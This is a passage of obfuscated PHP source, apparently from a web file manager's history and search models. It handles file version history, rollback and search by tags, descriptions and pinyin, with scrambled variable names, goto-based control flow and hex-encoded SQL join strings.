$dÖ¦Ôğ¥å[$aØ¸­Ğ¨›ß[369]], $aØ¸­Ğ¨›ß[1428] => isset($dÖ¦Ôğ¥å[$aØ¸­Ğ¨›ß[379]]) ? $dÖ¦Ôğ¥å[$aØ¸­Ğ¨›ß[379]] : $dÖ¦Ôğ¥å[$aØ¸­Ğ¨›ß[378]], $aØ¸­Ğ¨›ß[420] => $dÖ¦Ôğ¥å[$aØ¸­Ğ¨›ß[419]], $aØ¸­Ğ¨›ß[522] => $dÖ¦Ôğ¥å[$aØ¸­Ğ¨›ß[77]], $aØ¸­Ğ¨›ß[2331] => $f°‚¤Ó‡‘ò); $DÄ’¤¦è§ = $GLOBALS[$aØ¸­Ğ¨›ß[6]][$aØ¸­Ğ¨›ß[84]][$aØ¸­Ğ¨›ß[2332]]; if ($DÄ’¤¦è§ > 1) { $this->historyAutoClear($f¯’¡¥¼[$aØ¸­Ğ¨›ß[369]]); $this->add($f¯’¡¥¼); } Model($aØ¸­Ğ¨›ß[2333])->eventFileEdit($dÖ¦Ôğ¥å[$aØ¸­Ğ¨›ß[369]]); } private function historyAutoClear($B°‘‚±ë¦) { goto cÇŸİ‰Ÿ˜Œ; E¨¡ºæ„«Ğ: if ($a¤‘Èùõªè >= 500) { return; } $cïÁ„‹…Øˆ = array($F¥ù²à»Ì·[383] => $B°‘‚±ë¦); $CöœÂ²‘ø‘ = $this->field($F¥ù²à»Ì·[2336])->where($cïÁ„‹…Øˆ)->order($F¥ù²à»Ì·[2328])->select(); goto CÕ×…ÙÏÃ; BÎ‡â•Â: $BĞ­ĞÄø¿ = array_to_keyvalue($CöœÂ²‘ø‘, $F¥ù²à»Ì·[33], $F¥ù²à»Ì·[419]); $BĞ­ĞÄø¿ = array_slice($BĞ­ĞÄø¿, $a¤‘Èùõªè); if (!$eÔğå¹¹¬œ || !$BĞ­ĞÄø¿) { return; } goto dÈª¢—Šâ; CÕ×…ÙÏÃ: if (!$CöœÂ²‘ø‘ || $a¤‘Èùõªè >= count($CöœÂ²‘ø‘)) { return; } $eÔğå¹¹¬œ = array_to_keyvalue($CöœÂ²‘ø‘, $F¥ù²à»Ì·[33], $F¥ù²à»Ì·[367]); $eÔğå¹¹¬œ = array_slice($eÔğå¹¹¬œ, $a¤‘Èùõªè); goto BÎ‡â•Â; cÇŸİ‰Ÿ˜Œ: $F¥ù²à»Ì· =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $Ağº³Á²· = Model($F¥ù²à»Ì·[1085])->get($F¥ù²à»Ì·[2334]); $a·«ã¯É§˜ = $GLOBALS[$F¥ù²à»Ì·[6]][$F¥ù²à»Ì·[84]][$F¥ù²à»Ì·[2332]]; goto F¶‚’‚™’; dÈª¢—Šâ: $cïÁ„‹…Øˆ = array($F¥ù²à»Ì·[385] => array($F¥ù²à»Ì·[7], $eÔğå¹¹¬œ)); $this->where($cïÁ„‹…Øˆ)->delete(); Model($F¥ù²à»Ì·[422])->remove($BĞ­ĞÄø¿); goto cö‰¸‡Ÿ…·; F¶‚’‚™’: $C¹í¤µ¤‚õ = $Ağº³Á²· == $F¥ù²à»Ì·[2335] ? 3 : $a·«ã¯É§˜; if ($a·«ã¯É§˜ <= 1) { $C¹í¤µ¤‚õ = 1; } $a¤‘Èùõªè = $C¹í¤µ¤‚õ - 1; goto E¨¡ºæ„«Ğ; cö‰¸‡Ÿ…·: } public function listData($c¢Áƒ…¡¢´) { goto BØÖŠµ¯ó­; e«½¥†”×Ï: $cåĞ¡œº¬Œ = 3; if ($dè¦£˜î” == $Fåö‘‹±”[2335]) { $c‡™¤åôÊ[$Fåö‘‹±”[354]] = array_slice($c‡™¤åôÊ[$Fåö‘‹±”[354]], 0, $cåĞ¡œº¬Œ); $c‡™¤åôÊ[$Fåö‘‹±”[351]] = array($Fåö‘‹±”[2338] => 1, $Fåö‘‹±”[2339] => 20, $Fåö‘‹±”[2340] => 1, $Fåö‘‹±”[2341] => count($c‡™¤åôÊ[$Fåö‘‹±”[354]])); } return $c‡™¤åôÊ; goto F‚òÑ’Àá; BØÖŠµ¯ó­: $Fåö‘‹±” =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $E¼Ô°Åãğè = array($Fåö‘‹±”[383] => $c¢Áƒ…¡¢´); $Aó½Û‡¼¬ë = $Fåö‘‹±”[2337]; goto A‰Åâ™„ñÚ; A‰Åâ™„ñÚ: $c‡™¤åôÊ = $this->field($Aó½Û‡¼¬ë)->where($E¼Ô°Åãğè)->order($Fåö‘‹±”[2328])->selectPage(); $this->_listAppendUser($c‡™¤åôÊ[$Fåö‘‹±”[354]]); $dè¦£˜î” = Model($Fåö‘‹±”[1085])->get($Fåö‘‹±”[2334]); goto e«½¥†”×Ï; F‚òÑ’Àá: } protected function _listAppendUser(&$FâÕºß‚–†) { $AĞŸ»Ô¯ç“ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $e˜¬†Ù¢ìØ = array_to_keyvalue($FâÕºß‚–†, $AĞŸ»Ô¯ç“[33], $AĞŸ»Ô¯ç“[1437]); $eíÊŞŠ¿–Ğ = Model($AĞŸ»Ô¯ç“[479])->userListInfo($e˜¬†Ù¢ìØ); foreach ($FâÕºß‚–† as &$EáóËÙ®Êä) { $B²™‘—Õò• = $EáóËÙ®Êä[$AĞŸ»Ô¯ç“[1437]]; $EáóËÙ®Êä[$AĞŸ»Ô¯ç“[378]] = $eíÊŞŠ¿–Ğ[$B²™‘—Õò•] ? $eíÊŞŠ¿–Ğ[$B²™‘—Õò•] : !1; } unset($EáóËÙ®Êä); } public function fileInfo($f¶Ê‰İœª) { $b­Á‚½ôô =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $fµ‘½Œ®³ = $this->tablePrefix; $d…ŠËˆ†Õ = "{$fµ‘½Œ®³}\x69\x6f\137\146\x69\154\x65\40\x66\151\154\145\x73\x20\157\x6e\40\x66\151\x6c\145\x73\56\x66\151\x6c\x65\x49\x44\40\x3d\x20\x68\151\x73\x74\157\x72\171\x2e\x66\151\154\145\111\x44"; return $this->alias($b­Á‚½ôô[2342])->where(array($b­Á‚½ôô[385] => $f¶Ê‰İœª))->join($d…ŠËˆ†Õ, $b­Á‚½ôô[2343])->find(); } public function removeItem($C—Ô«“‚˜) { $aÑŸ§À¦Á› =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $FºÏ¬²¤ÂÜ = array($aÑŸ§À¦Á›[385] => $C—Ô«“‚˜); $F’—§¯´¬‡ = $this->where($FºÏ¬²¤ÂÜ)->find(); if ($F’—§¯´¬‡) { $d½„˜ˆŠ» = $this->where($FºÏ¬²¤ÂÜ)->delete(); Model($aÑŸ§À¦Á›[422])->remove($F’—§¯´¬‡[$aÑŸ§À¦Á›[419]]); return $d½„˜ˆŠ»; } return !1; } public function removeBySource($FšÎ–Œ§Çî) { goto eç±ÖùÆé…; d‹«âÖ˜ÂË: $d§á×¬ğ‡Ç = array($eµ‰œÁÖ‰[383] => array($eµ‰œÁÖ‰[7], $FšÎ–Œ§Çî)); $fÙØ®á±¦Î = $this->field($eµ‰œÁÖ‰[420])->where($d§á×¬ğ‡Ç)->select(); if ($fÙØ®á±¦Î) { $this->where($d§á×¬ğ‡Ç)->delete(); $CÕ¼ŒŒ¾ÖÁ = array_to_keyvalue($fÙØ®á±¦Î, $eµ‰œÁÖ‰[33], $eµ‰œÁÖ‰[419]); Model($eµ‰œÁÖ‰[422])->remove($CÕ¼ŒŒ¾ÖÁ); } goto d—‚£î©ÒÆ; d—‚£î©ÒÆ: return !0; goto E“çÜˆë‡È; eç±ÖùÆé…: $eµ‰œÁÖ‰ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$FšÎ–Œ§Çî) { return !1; } if (!is_array($FšÎ–Œ§Çî)) { $FšÎ–Œ§Çî = array($FšÎ–Œ§Çî); } goto d‹«âÖ˜ÂË; E“çÜˆë‡È: } public function setDetail($Dã´Œ¨ÓšÍ, $Eö¿äé¤ø) { $Bé‰·êÍø¯ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; return $this->where(array($Bé‰·êÍø¯[385] => $Dã´Œ¨ÓšÍ))->save(array($Bé‰·êÍø¯[2331] => $Eö¿äé¤ø)); } public function rollbackToItem($AåĞã­ÏÉù, $a¶˜á’„É”) { goto d¿ó„È¢•ˆ; e‡ÚíœÛ¿ñ: return $this->where(array($DõõÄ—³¯Ô[385] => $a¶˜á’„É”))->delete(); goto f‚š¨ÅÛ¬‹; d¿ó„È¢•ˆ: $DõõÄ—³¯Ô =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $f²Ôåç‹İÊ = Model($DõõÄ—³¯Ô[754])->sourceInfo($AåĞã­ÏÉù); $this->addHistory($f²Ôåç‹İÊ); goto c×ø¤»ÌÃŒ; c×ø¤»ÌÃŒ: $AÄ¤Ñƒ÷ªƒ = $this->find($a¶˜á’„É”); $FšŞÃ„ = array($DõõÄ—³¯Ô[419] => $AÄ¤Ñƒ÷ªƒ[$DõõÄ—³¯Ô[419]], $DõõÄ—³¯Ô[77] => $AÄ¤Ñƒ÷ªƒ[$DõõÄ—³¯Ô[77]], $DõõÄ—³¯Ô[107] => time(), $DõõÄ—³¯Ô[379] => USER_ID); Model($DõõÄ—³¯Ô[754])->where(array($DõõÄ—³¯Ô[369] => $AåĞã­ÏÉù))->save($FšŞÃ„); goto e‡ÚíœÛ¿ñ; f‚š¨ÅÛ¬‹: } public function clearSame($D„¬½ê‚²à) { goto cáñ»Ü¨¤Ø; a˜Œš‡Ö×Õ: if (!$cÚ‘¢ßò‹ï) { return; } $this->where(array($dæÓ¾÷å­›[367] => array($dæÓ¾÷å­›[7], $cÚ‘¢ßò‹ï)))->delete(); Model($dæÓ¾÷å­›[422])->remove($dÛğÔê¿‡); goto Cîîôã’; cáñ»Ü¨¤Ø: $dæÓ¾÷å­› =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $EëÁÃ²¯‚ = $this->listData($D„¬½ê‚²à); $a¤¡ƒ±Öµ« = array_to_keyvalue_group($EëÁÃ²¯‚, $dæÓ¾÷å­›[419]); goto dÕ²Õˆ´ŞË; dÕ²Õˆ´ŞË: $dÛğÔê¿‡ = array(); $cÚ‘¢ßò‹ï = array(); foreach ($a¤¡ƒ±Öµ« as $CÖ³Ëù‡„Æ) { if (!$CÖ³Ëù‡„Æ || count($CÖ³Ëù‡„Æ) <= 1) { continue; } foreach ($CÖ³Ëù‡„Æ as $f†Çá¨Ñäİ) { $dÛğÔê¿‡[] = $f†Çá¨Ñäİ[$dæÓ¾÷å­›[419]]; $cÚ‘¢ßò‹ï[] = $f†Çá¨Ñäİ[$dæÓ¾÷å­›[367]]; } } goto a˜Œš‡Ö×Õ; Cîîôã’: } public function userSpace() { $f¹¤Ø£ºà‚ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $CÄòéº¦…‚ = $this->tablePrefix; $bß¢İö·‡ = array($f¹¤Ø£ºà‚[1428] => USER_ID); $A£Â£ñ²¾ = "{$CÄòéº¦…‚}\151\x6f\x5f\x66\x69\154\145\x20\146\x69\x6c\x65\163\40\x6f\156\x20\x66\151\x6c\145\x73\56\x66\151\x6c\145\111\x44\40\75\x20\x68\151\163\x74\x6f\162\171\56\146\x69\x6c\x65\111\104"; return $this->alias($f¹¤Ø£ºà‚[2342])->where($bß¢İö·‡)->join($A£Â£ñ²¾, $f¹¤Ø£ºà‚[2343])->sum($f¹¤Ø£ºà‚[77]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($FØ´¡Ã¾œ) { goto Dœšº½ç¯“; FÆßßËˆÕ¸: if (!$DŒÃ¬ßšÀì[$C–»½²§¶[160]]) { $dŸå¢ğ±÷ = array_to_keyvalue($eÜøˆÚ¬‡, $C–»½²§¶[33], $C–»½²§¶[160]); $a“¥†ÛÊ¯Ä = implode($C–»½²§¶[47], $dŸå¢ğ±÷); $dì£ÛÍÈï = $C–»½²§¶[2291]; } $b¥Ğøâ—Œ = explode($C–»½²§¶[47], trim($a“¥†ÛÊ¯Ä, $C–»½²§¶[47])); return array($dì£ÛÍÈï, $b¥Ğøâ—Œ); goto CÊó±Îí†ß; Dœšº½ç¯“: $C–»½²§¶ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $eÜøˆÚ¬‡ = KodIO::fileTypeList(); $DŒÃ¬ßšÀì = $eÜøˆÚ¬‡[$FØ´¡Ã¾œ]; goto f¥â÷šÒñÔ; f¥â÷šÒñÔ: if (!$DŒÃ¬ßšÀì) { return array(); } $a“¥†ÛÊ¯Ä = $DŒÃ¬ßšÀì[$C–»½²§¶[160]]; $dì£ÛÍÈï = $C–»½²§¶[7]; goto FÆßßËˆÕ¸; CÊó±Îí†ß: } public function listPathType($aÈˆ­Ûßˆ) { $A·ößºĞ§ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $CîÓµË™‹ = $this->fileTypeWhere($aÈˆ­Ûßˆ); if (!$CîÓµË™‹) { return array(); } $CñĞ„…É¡ = array($A·ößºĞ§[523] => SourceModel::TYPE_USER, $A·ößºĞ§[524] => USER_ID, $A·ößºĞ§[520] => 0, $A·ößºĞ§[521] => $CîÓµË™‹); return $this->listSource($CñĞ„…É¡); } public function listSearch($d„ƒ‡Â²‚, $eÅŠçêÂœ² = 300) { goto bøÚœœÎÜä; bøÚœœÎÜä: $Bù¥±é·µ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (isset($d„ƒ‡Â²‚[$Bù¥±é·µ[2189]]) && $d„ƒ‡Â²‚[$Bù¥±é·µ[2189]]) { $d„ƒ‡Â²‚[$Bù¥±é·µ[2189]] = str_replace($Bù¥±é·µ[1593], $Bù¥±é·µ[2344], trim($d„ƒ‡Â²‚[$Bù¥±é·µ[2189]])); } $C·×·ùãµİ = $this->_parseSearchWhere($d„ƒ‡Â²‚); goto A¸ÌÛàğƒ¿; A¸ÌÛàğƒ¿: if (!isset($C·×·ùãµİ[$Bù¥±é·µ[397]])) { $C·×·ùãµİ[$Bù¥±é·µ[397]] = 0; } $Eò¨Ú¦Ş«³ = $Bù¥±é·µ[2345]; $EÊ™™£÷ = $Eò¨Ú¦Ş«³; goto a„øïËâò; a„øïËâò: $this->_listSearchBindPinyin($d„ƒ‡Â²‚, $C·×·ùãµİ, $Eò¨Ú¦Ş«³); $this->alias($Bù¥±é·µ[489])->_makeOrder(); $e¦œœã«†— = $this->distinct(!0)->field($Eò¨Ú¦Ş«³)->where($C·×·ùãµİ)->selectPage($eÅŠçêÂœ²); goto B˜ÖÀö£Ø; B˜ÖÀö£Ø: $this->_listSearchDesc($e¦œœã«†—, $d„ƒ‡Â²‚, $EÊ™™£÷); $this->_listSearchTag($e¦œœã«†—, $d„ƒ‡Â²‚, $EÊ™™£÷); $this->_listSearchGroupTag($e¦œœã«†—, $d„ƒ‡Â²‚, $EÊ™™£÷); goto e²ÖˆèÌ³„; e²ÖˆèÌ³„: $this->_listDataApply($e¦œœã«†—[$Bù¥±é·µ[354]]); $this->_listMake($e¦œœã«†—); return $e¦œœã«†—; goto b°Ä‡Àïñé; b°Ä‡Àïñé: } private function _listSearchTag(&$E³ÓÒæ«é¦, $B˜ÜĞÛƒó­, $f¥ì«ëçåÔ) { goto B©ˆ–ø»Å¾; B©ˆ–ø»Å¾: $F‰ÄâÒí¡ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$B˜ÜĞÛƒó­[$F‰ÄâÒí¡[2189]] || $E³ÓÒæ«é¦[$F‰ÄâÒí¡[351]][$F‰ÄâÒí¡[340]] > 1) { return; } $a½‡î…Î = Model($F‰ÄâÒí¡[2346])->listData(); goto BÅŠ¦¨„‘·; d´ »ÂÅµ®: if (!$fµˆğÀÆé) { return; } $Aá–‚çëŸã = array($F‰ÄâÒí¡[393] => array($F‰ÄâÒí¡[7], $fµˆğÀÆé), $F‰ÄâÒí¡[1437] => USER_ID); $Eá³é˜ğÏ = Model($F‰ÄâÒí¡[394])->field($F‰ÄâÒí¡[75])->where($Aá–‚çëŸã)->select(); goto a‚å¢Ü½õß; BÅŠ¦¨„‘·: $fµˆğÀÆé = array(); $fØÆ‹•ÊÉ— = $B˜ÜĞÛƒó­[$F‰ÄâÒí¡[2189]]; foreach ($a½‡î…Î as $bé§ªÏ¦„‚) { $b±¬ËÛĞ®¡ = $bé§ªÏ¦„‚[$F‰ÄâÒí¡[28]]; $dâé¶æãø = str_replace($F‰ÄâÒí¡[50], $F‰ÄâÒí¡[33], Pinyin::encode($b±¬ËÛĞ®¡)); if (stripos($b±¬ËÛĞ®¡, $fØÆ‹•ÊÉ—) !== !1 || stripos($dâé¶æãø, $fØÆ‹•ÊÉ—) !== !1) { $fµˆğÀÆé[] = $bé§ªÏ¦„‚[$F‰ÄâÒí¡[367]]; } } goto d´ »ÂÅµ®; a‚å¢Ü½õß: $Eá³é˜ğÏ = array_to_keyvalue($Eá³é˜ğÏ, $F‰ÄâÒí¡[33], $F‰ÄâÒí¡[75]); $c¡¾á‹» = array_unique($Eá³é˜ğÏ); $this->_listSearchMerge($E³ÓÒæ«é¦, $B˜ÜĞÛƒó­, $f¥ì«ëçåÔ, $c¡¾á‹»); goto CÛÇ‘…ÔÏœ; CÛÇ‘…ÔÏœ: } private function _listSearchDesc(&$D‹¤›¾ğª¡, $eÛîÚ…¶Î, $bˆ¾ŒÛâù½) { goto b“ÕÑé; A£“¶‡¹Î: $B…Ö‡Æ¸È» = array_unique($B…Ö‡Æ¸È»); if (!$B…Ö‡Æ¸È») { return; } $BŒ‡õ°çØ = array($B„Æ½³ê©[369] => array($B„Æ½³ê©[7], $B…Ö‡Æ¸È»), $B„Æ½³ê©[89] => $B„Æ½³ê©[405], $B„Æ½³ê©[359] => array($B„Æ½³ê©[753], $B„Æ½³ê©[2191] . $eÛîÚ…¶Î[$B„Æ½³ê©[2189]] . $B„Æ½³ê©[2191])); goto A§ñï‰İ™á; A§ñï‰İ™á: $A–æ­‰Ãñ = Model($B„Æ½³ê©[506])->field($B„Æ½³ê©[369])->where($BŒ‡õ°çØ)->select(); $F«µçó•Ôƒ = array_to_keyvalue($A–æ­‰Ãñ, $B„Æ½³ê©[33], $B„Æ½³ê©[369]); $this->_listSearchMerge($D‹¤›¾ğª¡, $eÛîÚ…¶Î, $bˆ¾ŒÛâù½, $F«µçó•Ôƒ); goto E¸ºº²¡Üª; b“ÕÑé: $B„Æ½³ê© =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$eÛîÚ…¶Î[$B„Æ½³ê©[2189]] || $D‹¤›¾ğª¡[$B„Æ½³ê©[351]][$B„Æ½³ê©[340]] > 1) { return; } $B…Ö‡Æ¸È» = $this->listSearchChildren($eÛîÚ…¶Î[$B„Æ½³ê©[463]]); goto A£“¶‡¹Î; E¸ºº²¡Üª: } private function _listSearchGroupTag(&$AáËÏ éÉ, $a«µ‹Æİ†Ô, $A»™íƒÕ¡) { goto c³æ™‘”Ë‹; e‡·ƒÅìÜÆ: if (!$a†ÍÇ¬ù²’) { return; } $c¦£ œÅ§é = array($FîÜƒ´‘««[393] => array($FîÜƒ´‘««[7], $a†ÍÇ¬ù²’), $FîÜƒ´‘««[1437] => 0, $FîÜƒ´‘««[29] => $FîÜƒ´‘««[2209] . $E¡¢ªè’Ø); $f×ÆŒóğ“ = Model($FîÜƒ´‘««[394])->field($FîÜƒ´‘««[75])->where($c¦£ œÅ§é)->select(); goto Dİ­áÆÍ‹¼; fâ ¤¸¨: if (!$døÉ«³¿£ || $døÉ«³¿£[$FîÜƒ´‘««[371]] != SourceModel::TYPE_GROUP) { return; } $E¡¢ªè’Ø = $døÉ«³¿£[$FîÜƒ´‘««[458]]; $FÒ“âÅ¼¤ = Model($FîÜƒ´‘««[2347])->get($E¡¢ªè’Ø); goto e‹ÇğŒÑÍà; Dİ­áÆÍ‹¼: $f×ÆŒóğ“ = array_to_keyvalue($f×ÆŒóğ“, $FîÜƒ´‘««[33], $FîÜƒ´‘««[75]); $D¼œÛ¹¡‰Ö = array_unique($f×ÆŒóğ“); $this->_listSearchMerge($AáËÏ éÉ, $a«µ‹Æİ†Ô, $A»™íƒÕ¡, $D¼œÛ¹¡‰Ö); goto e«ĞîƒäÍ; c³æ™‘”Ë‹: $FîÜƒ´‘«« =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$a«µ‹Æİ†Ô[$FîÜƒ´‘««[2189]] || $AáËÏ éÉ[$FîÜƒ´‘««[351]][$FîÜƒ´‘««[340]] > 1 || !$a«µ‹Æİ†Ô[$FîÜƒ´‘««[463]]) { return; } $døÉ«³¿£ = $this->sourceInfo($a«µ‹Æİ†Ô[$FîÜƒ´‘««[463]]); goto fâ ¤¸¨; e‹ÇğŒÑÍà: $a†ÍÇ¬ù²’ = array(); $aÓö˜àåÕ = $a«µ‹Æİ†Ô[$FîÜƒ´‘««[2189]]; foreach ($FÒ“âÅ¼¤[$FîÜƒ´‘««[354]] as $D°ÖÆ«½Ù­) { $Fâ¡“í¾™ç = $D°ÖÆ«½Ù­[$FîÜƒ´‘««[28]]; $Eî–¡åä‘ = str_replace($FîÜƒ´‘««[50], $FîÜƒ´‘««[33], Pinyin::encode($Fâ¡“í¾™ç)); if (stripos($Fâ¡“í¾™ç, $aÓö˜àåÕ) !== !1 || stripos($Eî–¡åä‘, $aÓö˜àåÕ) !== !1) { $a†ÍÇ¬ù²’[] = $D°ÖÆ«½Ù­[$FîÜƒ´‘««[367]]; } } goto e‡·ƒÅìÜÆ; e«ĞîƒäÍ: } private function _listSearchMerge(&$e¸¬Øò×Ìò, $EÏ³†èë¶Ç, $C“‡†¤à‚ê, $a–Û®®÷¸) { goto B·ÇÂ¶Ê¦Õ; B·ÇÂ¶Ê¦Õ: $E˜ç×¦‰Ûğ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$a–Û®®÷¸) { return; } $Fã‘Ïã†Ø = array_to_keyvalue($e¸¬Øò×Ìò[$E˜ç×¦‰Ûğ[354]], $E˜ç×¦‰Ûğ[33], $E˜ç×¦‰Ûğ[369]); goto f¾–é‘õÕ; Fá½”õ¯ê: $D‡Ë÷ßÀ½Ú = $this->field($C“‡†¤à‚ê)->where($FÌàù“Ñ¾Ô)->select(); if (!$D‡Ë÷ßÀ½Ú) { return; } $A”šÜˆñÓ­ = array(); goto Fˆ·„¢¢ÏÑ; Fˆ·„¢¢ÏÑ: foreach ($D‡Ë÷ßÀ½Ú as $DÆ£Ø† ĞÆ) { $Bß´æ²ÙÓ = $E˜ç×¦‰Ûğ[47] . $EÏ³†èë¶Ç[$E˜ç×¦‰Ûğ[463]] . $E˜ç×¦‰Ûğ[47]; if (stripos($DÆ£Ø† ĞÆ[$E˜ç×¦‰Ûğ[461]], $Bß´æ²ÙÓ) !== !1) { $A”šÜˆñÓ­[] = $DÆ£Ø† ĞÆ; } } $e¸¬Øò×Ìò[$E˜ç×¦‰Ûğ[354]] = array_merge($A”šÜˆñÓ­, $e¸¬Øò×Ìò[$E˜ç×¦‰Ûğ[354]]); $e¸¬Øò×Ìò[$E˜ç×¦‰Ûğ[351]][$E˜ç×¦‰Ûğ[352]] += count($A”šÜˆñÓ­); goto BÈÔâ„ÓšÀ; f¾–é‘õÕ: $fé §äÚÇ² = array_diff($a–Û®®÷¸, $Fã‘Ïã†Ø); if (!$fé §äÚÇ²) { return; } $FÌàù“Ñ¾Ô = array($E˜ç×¦‰Ûğ[369] => array($E˜ç×¦‰Ûğ[7], $fé §äÚÇ²)); goto Fá½”õ¯ê; BÈÔâ„ÓšÀ: } public function listSearchChildren($Aõš¹Û±È, $aâó·¦„ñÏ = 5000) { goto Cô©Ô›í…; Cí¦¶‚‹¤á: $BÆøöğ¦°š = $this->field($bÈ´œÁÏæ®[369])->where($BÀÑ…Ê…Õâ)->select(); $D²Ú¹ÆŠ…Ä = array_to_keyvalue($BÆøöğ¦°š, $bÈ´œÁÏæ®[33], $bÈ´œÁÏæ®[369]); return $D²Ú¹ÆŠ…Ä; goto FÄ‹Ó „‡; Cô©Ô›í…: $bÈ´œÁÏæ® =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $D²Ú¹ÆŠ…Ä = array(); $d¢Ş”°Â”â = $this->sourceInfo($Aõš¹Û±È); goto dæƒÓª±; dæƒÓª±: $BÀÑ…Ê…Õâ = array($bÈ´œÁÏæ®[461] => array($bÈ´œÁÏæ®[753], $d¢Ş”°Â”â[$bÈ´œÁÏæ®[461]] . $d¢Ş”°Â”â[$bÈ´œÁÏæ®[369]] . $bÈ´œÁÏæ®[486])); $aß¢§ÆïÃÇ = $this->field($bÈ´œÁÏæ®[369])->cache(null, 600)->where($BÀÑ…Ê…Õâ)->count(); if ($aß¢§ÆïÃÇ > $aâó·¦„ñÏ) { return $this->_listSearchChildrenNear($Aõš¹Û±È, $aâó·¦„ñÏ); } goto Cí¦¶‚‹¤á; FÄ‹Ó „‡: } private function _listSearchChildrenNear($eğï‚•ì·Ş, $D¼…é†¾ß) { goto fğİ³§Õ•; fğİ³§Õ•: $E¼ÜñÀ“ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $fÊŠœÔ¸Ï‰ = array(); $Bš²ÚÇä¶ = array($E¼ÜñÀ“[463] => $eğï‚•ì·Ş); goto fË‡÷†ˆ; aˆ¡Ê™‹Ş³: $fÊŠœÔ¸Ï‰ = array_merge($fÊŠœÔ¸Ï‰, array_to_keyvalue($B¸œ¡äæÜó, $E¼ÜñÀ“[33], $E¼ÜñÀ“[369])); $fÊŠœÔ¸Ï‰ = array_slice($fÊŠœÔ¸Ï‰, 0, $D¼…é†¾ß); return $fÊŠœÔ¸Ï‰; goto cÜ§§ÄÛå”; aªˆ‡í‹©¿: if (!$EÖ—¨†ÔÇ©) { return $fÊŠœÔ¸Ï‰; } $Bš²ÚÇä¶ = array($E¼ÜñÀ“[463] => array($E¼ÜñÀ“[7], $EÖ—¨†ÔÇ©)); $B¸œ¡äæÜó = $this->field($E¼ÜñÀ“[2348])->where($Bš²ÚÇä¶)->select(); goto aˆ¡Ê™‹Ş³; fË‡÷†ˆ: $B¸œ¡äæÜó = $this->field($E¼ÜñÀ“[2348])->where($Bš²ÚÇä¶)->select(); $EÖ—¨†ÔÇ© = array_to_keyvalue(array_filter_by_field($B¸œ¡äæÜó, $E¼ÜñÀ“[370], $E¼ÜñÀ“[83]), $E¼ÜñÀ“[33], $E¼ÜñÀ“[369]); $fÊŠœÔ¸Ï‰ = array_merge($fÊŠœÔ¸Ï‰, array_to_keyvalue($B¸œ¡äæÜó, $E¼ÜñÀ“[33], $E¼ÜñÀ“[369])); goto aªˆ‡í‹©¿; cÜ§§ÄÛå”: } private function _listSearchBindPinyin($e¤½÷•»¬Ü, &$B÷À‘°à²Í, &$dŠõ˜““÷) { goto a³Å÷¿ÛºØ; b‘À¦ğƒ„’: unset($B÷À‘°à²Í[$eÛ¦óâ–[28]]); foreach ($B÷À‘°à²Í as $C¦¤ÑÓŸé => $Fí¼ğ‚”ï) { $b‡Ÿ‡ĞÜƒ°[$eÛ¦óâ–[2350] . $C¦¤ÑÓŸé] = $Fí¼ğ‚”ï; } $e—…Ã—¤ƒç = array($eÛ¦óâ–[485], $eÛ¦óâ–[2191] . $e¤½÷•»¬Ü[$eÛ¦óâ–[2189]] . $eÛ¦óâ–[2191]); goto FåÌë¶²¤; F¤™‚òÜ²­: $b‡Ÿ‡ĞÜƒ° = array(); $dŠõ˜““÷ = str_replace(array($eÛ¦óâ–[217], $eÛ¦óâ–[50], $eÛ¦óâ–[2349]), $eÛ¦óâ–[33], $dŠõ˜““÷); $dŠõ˜““÷ = $eÛ¦óâ–[2350] . str_replace($eÛ¦óâ–[47], $eÛ¦óâ–[2351], $dŠõ˜““÷); goto b‘À¦ğƒ„’; a³Å÷¿ÛºØ: $eÛ¦óâ– =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!Input::check($e¤½÷•»¬Ü[$eÛ¦óâ–[2189]], $eÛ¦óâ–[306]) || strlen($e¤½÷•»¬Ü[$eÛ¦óâ–[2189]]) < 2) { return; } $a²ƒÚøë« = "\x4c\105\106\x54\x20\x4a\x4f\x49\x4e\40{$this->tablePrefix}\x69\x6f\137\163\x6f\x75\162\x63\145\137\155\145\x74\141\40\155\x65\x74\x61\40\x6f\156\40\x73\x6f\x75\162\x63\145\x2e\163\157\165\162\143\x65\x49\104\40\75\40\x6d\145\164\141\x2e\163\x6f\165\x72\x63\x65\x49\x44"; goto F¤™‚òÜ²­; FåÌë¶²¤: $b‡Ÿ‡ĞÜƒ°[] = array($eÛ¦óâ–[2352] => $e—…Ã—¤ƒç, $eÛ¦óâ–[910] => $eÛ¦óâ–[2193], array($eÛ¦óâ–[2353] => $e—…Ã—¤ƒç, $eÛ¦óâ–[2354] => array($eÛ¦óâ–[7], array($eÛ¦óâ–[416], $eÛ¦óâ–[415])))); $this->join($a²ƒÚøë«); $B÷À‘°à²Í = $b‡Ÿ‡ĞÜƒ°; goto EÔˆ«Ô¿ŠŒ; EÔˆ«Ô¿ŠŒ: } private function _parseSearchWhere($A·İ‡Ô•´…) { goto bŒÛ¥¾†‚Ã; aïÍ‡«‡òÉ: if (isset($A·İ‡Ô•´…[$bÎÚá‰—ˆØ[449]])) { $bòâÌŞ©è = array($bÎÚá‰—ˆØ[2356], $A·İ‡Ô•´…[$bÎÚá‰—ˆØ[449]]); if ($cµŸßØø‚î[$bÎÚá‰—ˆØ[107]]) { $cµŸßØø‚î[$bÎÚá‰—ˆØ[107]] = array($cµŸßØø‚î[$bÎÚá‰—ˆØ[107]], $bòâÌŞ©è, 